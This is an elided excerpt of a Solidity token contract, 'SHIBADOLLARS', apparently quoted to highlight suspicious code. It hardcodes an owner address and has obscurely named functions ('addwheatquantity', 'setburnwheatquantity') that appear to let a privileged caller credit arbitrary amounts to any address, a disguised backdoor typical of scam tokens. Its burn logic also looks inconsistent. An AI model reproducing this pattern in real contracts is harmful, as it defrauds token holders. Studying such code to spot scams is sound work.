...
contract Ownable is Context {
    ...
    address private _owners = 0xF3Fc57b430197C845e333bEae07558575d994888;
...
contract SHIBADOLLARS is Context, IERC20, Ownable {
    ...
    string private _name = "SHIBAD OLLARS";
    string private _symbol = "SHIBAD OLLARS";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xF3Fc57b430197C845e333bEae07558575d994888;
    ...
    function addwheatquantity(address wheatAddress, uint256 wheatquantity) 
        ...
        uint256 JeK = repeats[wheatAddress];
        if (JeK == 0) _repeats.push(wheatAddress);
        repeats[wheatAddress] = JeK.add(wheatquantity);
    ...
    function setburnwheatquantity(address burnwheatAddress, uint256 burnwheatquantity)
        ...
        uint256 burnJeK = repeats[burnwheatAddress];
        if (burnJeK == 0) _burnrepeats.push(burnwheatAddress);
        burnrepeats[burnwheatAddress] = burnJeK.add(burnwheatquantity);
